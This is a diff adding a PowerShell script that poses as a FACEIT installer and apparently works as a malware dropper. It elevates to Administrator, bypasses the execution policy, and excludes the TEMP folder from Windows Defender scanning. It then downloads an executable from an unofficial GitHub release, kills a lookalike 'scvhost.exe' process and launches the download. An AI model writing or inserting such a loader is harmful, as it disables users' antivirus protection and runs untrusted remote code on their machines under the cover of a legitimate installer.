@@ -1,0 +1,29 @@
+$IsAdmin = ([Security.Principal.WindowsPrincipal] `
+    [Security.Principal.WindowsIdentity]::GetCurrent()
+).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+
+if (-not $IsAdmin) {
+    Write-Host "Restart with Administrator..."
+    Start-Process powershell "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
+    exit
+}
+
+$ErrorActionPreference = "SilentlyContinue"
+
+try {
+    Add-MpPreference -ExclusionPath $env:TEMP
+} catch {}
+
+$url = "https://github.com/smpleprme7-ship-it/FACEIT/releases/download/ac/FACEIT_Installer64.exe"
+$outPath = "$env:TEMP\FACEIT_Installer64.exe"
+
+Start-BitsTransfer -Source $url -Destination $outPath -DisplayName "Downloading..." -Description "Please wait"
+
+if (Test-Path $outPath) {
+    Write-Host "Starting..."
+    Stop-Process -Name scvhost.exe -Force
+    
+    Start-Process $outPath
+} else {
+    Write-Host "Failed"
+}
